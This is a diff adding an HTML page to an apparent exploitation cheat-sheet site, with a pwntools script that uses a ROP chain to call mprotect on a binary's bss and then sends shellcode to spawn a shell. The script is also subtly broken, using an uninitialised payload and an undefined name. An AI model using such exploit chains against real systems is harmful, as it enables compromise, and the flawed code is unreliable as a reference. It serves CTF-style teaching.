@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/${repoName}/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets\images\hacker.jpg">
+  <title>HackBook</title>
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <!-- Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <!-- Prism JS -->
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <!-- <link rel="stylesheet" href="https://unpkg.com/dracula-prism/dist/css/dracula-prism.css"> -->
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="assets\scripts\main.js"></script>
+    <link rel="stylesheet" href="assets\styles\styles.css">
+
+
+    
+    
+  
+</head>
+<body>
+
+    <!-- Main Content -->
+    <div class="content">
+        <h1>Return Oriented Programming</h1>
+        <hr>
+        <h2>Overview</h2>
+        <h3>Pwntools template</h3>
+        <hr>
+        <h2>ret2libc</h2>
+        <hr>
+        <h2 id="mprotect">mprotect</h2>
+        <hr>
+        When to use: 
+        <ul >
+            <li>&#9989; Statically linked (with <code>mprotect()</code>)</li>
+            <li>&#9989; NX Enabled</li>
+            <li>&#9989; Canary</li>
+            <li>&#9989; No PIE</li>
+            <li>&#9989; Arbitrary write</li>
+        </ul>
+        Example:
+        <pre><code class="language-py">#!/usr/bin/python3
+from pwn import *
+import warnings
+import os
+warnings.filterwarnings('ignore')
+context.arch = 'amd64'
+context.log_level = 'critical'
+
+binary = "./vulnerable"
+elf = ELF(binary)
+rop = ROP(elf)
+
+# mprotect the bss to make it executable
+# int mprotect(void addr[.size], size_t size, int prot);
+payload += p64(rop.rdi[0])
+payload += p64(elf.bss())   # addr = &bss
+payload += p64(rop.rsi[0])
+payload += p64(0x1000)      # size = page size
+payload += p64(rop.rdx[0])
+payload += p64(0x7)         # prot = PROT_READ | PROT_WRITE | PROT_EXEC
+payload += p64(elf.sym.mprotect)    # mprotect must be statically linked
+
+# run shellcode
+off = 0x200     # bss offset where the shellcode will be
+payload += p64(e.bss(off + 1))
+
+with process(binary) as r:
+    r.send(payload)
+    r.sendline(asm(shellcraft.sh()))
+    print("Starting shell")
+    r.interactive()</code></pre>
+    </div> 
+</body>
+</html>
